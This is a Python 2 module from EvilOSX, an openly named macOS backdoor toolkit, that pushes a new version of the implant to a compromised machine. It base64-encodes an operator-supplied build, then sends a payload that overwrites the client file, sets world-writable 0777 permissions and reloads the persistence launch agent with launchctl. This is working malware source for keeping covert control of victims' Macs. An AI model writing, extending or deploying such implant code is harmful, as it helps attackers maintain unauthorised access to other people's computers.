from helpers import *
import os
import base64


class Module:
    """This module updates the client to a newer version of EvilOSX."""

    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Updates the client to a newer version of EvilOSX."
        }
        self.new_file = None

    def setup(self):
        file_location = raw_input(MESSAGE_INPUT + "Path to the built EvilOSX: ")
        file_location = os.path.expanduser(file_location)

        if not os.path.exists(file_location):
            print MESSAGE_ATTENTION + "File doesn't exist!"
            return False
        else:
            print MESSAGE_ATTENTION + "You are about to update the client using the file: " + file_location
            confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n] ").lower()

            if not confirm or confirm == "y":
                with open(file_location, "r") as input_file:
                    self.new_file = base64.b64encode("".join(input_file.readlines()))

                print MESSAGE_INFO + "Removing client..."
                return True
            else:
                print MESSAGE_INFO + "Cancelled."
                return False

    def run(self):
        return """\
            import base64
                        
            with open(get_program_file(), "w") as output_file:            
                output_file.write(base64.b64decode("{0}"))
            os.chmod(get_program_file(), 0777)  # Important!
            
            # Reload the launch agent.
            run_command("launchctl stop " + LAUNCH_AGENT_NAME + " && launchctl load -w " + get_launch_agent_file())
            """.format(self.new_file)
